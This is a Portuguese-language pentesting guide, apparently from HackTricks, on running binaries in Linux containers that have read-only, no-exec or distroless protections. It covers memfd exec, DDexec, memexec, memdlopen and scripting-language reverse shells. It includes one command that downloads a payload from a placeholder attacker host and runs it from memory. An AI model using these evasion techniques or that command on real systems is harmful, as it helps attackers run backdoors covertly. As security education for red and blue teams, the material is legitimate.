# Bypass de proteções do FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Vídeos

Nos vídeos a seguir, você encontrará as técnicas mencionadas nesta página explicadas com mais detalhes:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## Cenário read-only / no-exec

É cada vez mais comum encontrar máquinas Linux montadas com **proteção de sistema de arquivos somente leitura (ro)**, especialmente em containers. Isso acontece porque executar um container com sistema de arquivos ro é tão simples quanto definir **`readOnlyRootFilesystem: true`** no `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

No entanto, mesmo que o sistema de arquivos esteja montado como ro, **`/dev/shm`** continuará gravável; portanto, é falso que não possamos escrever nada no disco. Porém, essa pasta será **montada com proteção no-exec**, então, se você baixar um binário para ela, **não poderá executá-lo**.

> [!WARNING]
> De uma perspectiva de red team, isso torna **complicado baixar e executar** binários que não estejam no sistema (como backdoors ou enumeradores, por exemplo, `kubectl`).

## Bypass mais fácil: Scripts

Observe que mencionei binários: você pode **executar qualquer script** desde que o interpretador esteja presente na máquina, como um **shell script** se `sh` estiver presente ou um **script** **Python** se `python` estiver instalado.

No entanto, isso não é suficiente para executar seu backdoor binário ou outras ferramentas binárias que você possa precisar executar.

## Bypasses de memória

Se você quiser executar um binário, mas o sistema de arquivos não permitir isso, a melhor maneira de fazê-lo é **executá-lo a partir da memória**, pois as **proteções não se aplicam nesse local**.

### Bypass de FD + syscall exec

Se você tiver alguns mecanismos de script poderosos dentro da máquina, como **Python**, **Perl** ou **Ruby**, poderá baixar o binário a ser executado para a memória, armazená-lo em um descritor de arquivo de memória (syscall `create_memfd`), que não será protegido por essas proteções, e então chamar uma **syscall `exec`**, indicando o **fd como o arquivo a ser executado**.

Para isso, você pode usar facilmente o projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Você pode fornecer um binário a ele, e o projeto gerará um script na linguagem indicada com o **binário compactado e codificado em b64**, juntamente com as instruções para **decodificá-lo e descompactá-lo** em um **fd** criado por meio da chamada à syscall `create_memfd`, além de uma chamada à syscall **`exec`** para executá-lo.

> [!WARNING]
> Isso não funciona em outras linguagens de script, como PHP ou Node, porque elas não têm uma **forma padrão de chamar syscalls brutas** a partir de um script; portanto, não é possível chamar `create_memfd` para criar o **fd de memória** que armazenará o binário.
>
> Além disso, criar um **fd regular** com um arquivo em `/dev/shm` não funcionará, pois você não poderá executá-lo, já que a **proteção no-exec** será aplicada.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) é uma técnica que permite **modificar a memória do seu próprio processo** sobrescrevendo seu **`/proc/self/mem`**.

Assim, **controlando o código assembly** que está sendo executado pelo processo, você pode escrever um **shellcode** e "mutar" o processo para **executar qualquer código arbitrário**.

> [!TIP]
> **DDexec / EverythingExec** permitirá carregar e **executar** seu próprio **shellcode** ou **qualquer binário** a partir da **memória**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para obter mais informações sobre essa técnica, consulte o Github ou:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) é o próximo passo natural do DDexec. Trata-se de um **shellcode do DDexec transformado em daemon**, portanto, sempre que você quiser **executar um binary diferente**, não será necessário relançar o DDexec; basta executar o shellcode do memexec por meio da técnica DDexec e então **se comunicar com esse daemon para enviar novos binaries para carregar e executar**.

Você pode encontrar um exemplo de como usar o **memexec para executar binaries a partir de um PHP reverse shell** em [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Com um objetivo semelhante ao do DDexec, a técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite uma **maneira mais fácil de carregar binaries** na memória para executá-los posteriormente. Ela pode permitir até mesmo o carregamento de binaries com dependências.

## Distroless Bypass

Para uma explicação dedicada sobre **o que distroless realmente é**, quando ele ajuda, quando não ajuda e como ele altera as práticas de post-exploitation em containers, consulte:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### O que é distroless

Containers distroless contêm apenas os **componentes mínimos necessários para executar uma aplicação ou serviço específico**, como bibliotecas e dependências de runtime, mas excluem componentes maiores, como um gerenciador de pacotes, shell ou utilitários do sistema.

O objetivo dos containers distroless é **reduzir a attack surface dos containers eliminando componentes desnecessários** e minimizando o número de vulnerabilidades que podem ser exploradas.

### Reverse Shell

Em um container distroless, talvez você **nem encontre `sh` ou `bash`** para obter um shell comum. Você também não encontrará binaries como `ls`, `whoami`, `id`... tudo o que normalmente é executado em um sistema.

> [!WARNING]
> Portanto, você **não conseguirá obter um **reverse shell** ou **enumerar** o sistema como normalmente faria.

No entanto, se o container comprometido estiver executando, por exemplo, uma aplicação web Flask, o Python estará instalado e, portanto, você poderá obter um **Python reverse shell**. Se estiver executando Node, poderá obter um Node rev shell, e o mesmo se aplica à maioria das **linguagens de scripting**.

> [!TIP]
> Usando a linguagem de scripting, você poderá **enumerar o sistema** utilizando os recursos da própria linguagem.

Se não houver proteções de **`read-only/no-exec`**, você poderá abusar do seu reverse shell para **gravar os seus binaries no sistema de arquivos** e **executá-los**.

> [!TIP]
> No entanto, nesse tipo de container, essas proteções normalmente existirão, mas você poderá usar as **técnicas anteriores de execução em memória para contorná-las**.

Você pode encontrar **exemplos** de como **explorar algumas vulnerabilidades de RCE** para obter **reverse shells** de linguagens de scripting e executar binaries a partir da memória em [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

## Referências

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
